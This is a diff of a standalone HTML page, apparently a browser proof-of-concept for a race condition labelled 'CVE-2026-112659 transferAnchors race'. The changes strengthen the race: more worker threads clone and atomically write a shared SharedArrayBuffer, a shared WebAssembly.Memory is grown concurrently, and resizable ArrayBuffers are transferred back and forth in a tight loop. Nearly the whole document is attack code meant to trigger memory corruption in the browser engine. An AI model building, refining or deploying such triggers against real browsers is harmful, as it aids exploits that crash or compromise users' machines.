@@ -1,39 +1,55 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TA-RACE v3</title>
+<title>TA-RACE v4</title>
 <body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
-<div id=o>[TA-RACE v3]</div>
+<div id=o>[TA-RACE v4] CVE-2026-112659 transferAnchors race</div>
 <script>
 const o=document.getElementById('o');
 const log=m=>{o.textContent+="\n"+m;};
 const tick=()=>new Promise(r=>setTimeout(r,0));
 window.addEventListener('error',e=>log("[ERROR] "+e.message+" @ "+(e.lineno||"?")));
 log("[*] UA: "+navigator.userAgent);
-log("[*] SAB: "+(typeof SharedArrayBuffer!=="undefined"?"AVAILABLE":"BLOCKED - need COOP/COEP headers"));
 
-const WK=`let u8=null;
+// mode A+C worker: shared SAB + shared WASM memory handle from N threads
+const WK=`let u8=null, mem=null, who="";
+function lg(m){postMessage({log:who+" "+m});}
 onmessage=async e=>{
   if(e.data.sab){
-    u8=new Uint8Array(e.data.sab);
-    log2("worker "+e.data.who+" on SAB");
+    who=e.data.who; u8=new Uint8Array(e.data.sab);
+    lg("on SAB");
     let i=0;
     while(true){
       try{structuredClone(u8.subarray(0,256));}catch(_){}
+      try{structuredClone(u8.subarray(256,512));}catch(_){}
       Atomics.store(u8,(i>>>0)&0xFFFF,i&0xFF);
+      Atomics.add(u8,((i>>>0)+1)&0xFFFF,1);
       if((++i&0xFFF)===0) await new Promise(r=>setTimeout(r,0));
     }
   }
-};
-function log2(m){postMessage({log:m});}`;
+  if(e.data.mem){
+    who=e.data.who; mem=e.data.mem;
+    lg("on WASM shared mem");
+    let i=0;
+    while(true){
+      try{structuredClone(new Uint8Array(mem.buffer).subarray(0,128));}catch(_){}
+      try{mem.grow(1);}catch(_){}
+      if((++i&0x1FFF)===0) await new Promise(r=>setTimeout(r,0));
+    }
+  }
+};`;
 
 const wA=new Worker(URL.createObjectURL(new Blob([WK])));
 const wB=new Worker(URL.createObjectURL(new Blob([WK])));
+const wC=new Worker(URL.createObjectURL(new Blob([WK])));
+wA.onmessage=e=>{if(e.data.log)log(e.data.log);};
+wB.onmessage=e=>{if(e.data.log)log(e.data.log);};
+wC.onmessage=e=>{if(e.data.log)log(e.data.log);};
+
+// mode B ring worker: transfer adoptions ping-pong
 const wR=new Worker(URL.createObjectURL(new Blob([`
 onmessage=e=>{ for(const ab of e.data.abs){ try{new Uint8Array(ab)[0]=0x41;}catch(_){} try{postMessage({abs:[ab]},[ab]);}catch(_){} } };
 `])));
-log("[1] 3 workers up");
-wA.onmessage=e=>{if(e.data.log)log(e.data.log);};
-wB.onmessage=e=>{if(e.data.log)log(e.data.log);};
+log("[1] 4 workers up");
 
 let sab=null, mu8=null;
 try{
@@ -41,8 +57,16 @@ try{
   mu8=new Uint8Array(sab);
   wA.postMessage({sab,who:'A'});
   wB.postMessage({sab,who:'B'});
-  log("[2] SAB shared -> workers");
+  wC.postMessage({sab,who:'C'});
+  log("[2] SAB 64KB -> 3 workers (cross-thread handle sharing)");
 }catch(e){log("[FAIL] SAB: "+e.name);}
+
+try{
+  const m=new WebAssembly.Memory({initial:1,maximum:128,shared:true});
+  wA.postMessage({mem:m,who:'A'});
+  wB.postMessage({mem:m,who:'B'});
+  log("[3] shared WASM mem -> 2 workers");
+}catch(e){log("[-] WASM mem share blocked: "+e.name);}
 
 let inFlight=0;
 wR.onmessage=e=>{
@@ -54,13 +78,17 @@ wR.onmessage=e=>{
 
 (async()=>{
   let it=0;
+  log("[*] main loop: ring transfers + SAB clones + resizable AB churn");
   while(true){
-    if(inFlight<64){
+    if(inFlight<96){
       const ab=new ArrayBuffer(256,{maxByteLength:65536});
-      try{ab.resize(4096);}catch(_){}
+      try{ab.resize(4096+(it&8191));}catch(_){}
       try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
     }
-    if(mu8){try{structuredClone(mu8.subarray(0,256));}catch(_){}}
+    if(mu8){
+      try{structuredClone(mu8.subarray(0,256));}catch(_){}
+      try{structuredClone(mu8.subarray(512,768));}catch(_){}
+    }
     it++;
     if((it&0x3FF)===0){log("[*] it="+it+" inflight="+inFlight);await tick();}
   }
